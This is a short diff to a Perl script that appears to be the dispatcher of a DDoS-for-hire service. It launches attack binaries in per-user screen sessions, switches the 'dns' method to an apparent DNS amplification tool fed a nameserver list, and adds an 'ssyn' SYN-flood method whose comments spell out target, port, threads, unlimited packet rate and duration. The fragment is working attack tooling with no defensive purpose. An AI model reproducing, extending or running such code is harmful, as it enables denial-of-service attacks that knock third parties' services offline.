@@ -29,11 +29,17 @@ while(1)
 		print "Stopping attack from user: $username\n";
 		system("screen -S $username -X quit");
 	}
+	#DNS usage: <target> <port> <nameserver file> <threads> <time>
 	if ( $method =~ /^dns\s*$/ ) {
 		print "$username | $method $sec1 $sec2 $sec3 $sec4 $sec5 $other\n";
-		system("screen -dmS $username ./ss $sec1 $sec2 lest 10 $sec3 $other");
+		system("screen -dmS $username ./dns $sec1 $sec2 list.txt 10 $sec3");
 	}
-	
+	#SSYN usage: <target IP> <port to be flooded> <number threads to use> <pps limiter, -1 for no limit> <time>
+	if ($method =~ /^ssyn\s*$/ ) {
+		print "$username | $method $sec1 $sec2 $sec3 $sec4 $sec5 $other\n";
+		system("screen -dmS $username ./ssyn $sec1 $sec2 10 -1 $sec3");
+	}
+
 
 }
  
